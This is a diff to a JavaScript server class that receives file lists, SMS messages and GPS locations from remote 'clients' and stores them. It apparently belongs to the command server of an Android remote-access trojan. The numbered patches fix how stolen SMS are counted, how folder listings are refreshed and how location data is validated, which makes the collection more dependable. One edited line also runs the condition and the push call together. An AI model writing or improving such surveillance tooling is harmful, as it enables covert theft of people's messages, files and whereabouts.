@@ -146,9 +146,8 @@ class Clients {
 
             if (data.type === "list") {
                 let list = data.list;
-                if (list && Array.isArray(list) && list.length !== 0) {
-                    // cool, we have files!
-                    // somehow get this array back to the main thread...
+                if (list && Array.isArray(list)) {
+                    // Patch 5: Always update, even if list is empty, to prevent stale data
                     client.set('currentFolder', data.list).write();
                     logManager.log(CONST.logTypes.success, "File List Updated");
                 } else {
@@ -236,6 +235,7 @@ class Clients {
                             // cool, we dont have this sms
                             sms.hash = hash;
                             dbSMS.push(sms).write();
+                            newCount++; // Patch 6: Increment counter
                         }
                     });
                     logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
@@ -279,8 +279,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.location, (data) => {
-            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
-                client.get('GPSData').push({
+            if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {                client.get('GPSData').push({
                     time: new Date(),
                     enabled: data.enabled || false,
                     latitude: data.latitude || 0,
